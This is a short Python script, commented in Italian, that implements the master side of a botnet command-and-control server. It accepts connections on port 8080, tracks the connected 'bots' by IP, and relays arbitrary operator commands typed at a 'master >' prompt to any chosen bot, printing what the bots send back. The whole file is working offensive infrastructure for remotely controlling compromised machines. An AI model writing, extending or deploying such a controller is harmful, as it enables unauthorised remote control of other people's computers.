import socket, threading

bot_connessi = {}

def ascolto_connessioni(server):
    while True:
        conn, indirizzo = server.accept() # Bloccnate
        bot_connessi[indirizzo[0]] = conn # Salvo la socket nel dizionario
        
        nuovo_thread = threading.Thread(target=ascolto_client, args=(conn, indirizzo[0]))
        nuovo_thread.daemon = True
        nuovo_thread.start()

def ascolto_client(conn, ip):
    while True:
        try:
            message = conn.recv(4096).decode() # Bloccnate

            if not message:
                break

            print(f"\n[CLIENT: {ip}]\n{message}\nmaster >")
        except:
            break;

    # Se la connessione termina, eliminare l'ip dal dizionario
    print(f"\n[CLIENT: {ip} DISCONNESSO]")
    if ip in bot_connessi:
        del bot_connessi[ip]
    conn.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 8080))
    server.listen(5)
    
    t_accetta = threading.Thread(target=ascolto_connessioni, args=(server,))
    t_accetta.daemon = True
    t_accetta.start()

    print("Serve avviato con successo!\n")
    
    while True:
        comando = input("master > ")
        if comando.startswith("send"):
            target_ip = comando.split(" ", 2)[1]
            cmd = comando.split(" ", 2)[2]

            if target_ip in bot_connessi:
                bot_connessi[target_ip].send(cmd.encode())
        elif comando.startswith("list"):
            print(bot_connessi)

if __name__ == "__main__":
    main()
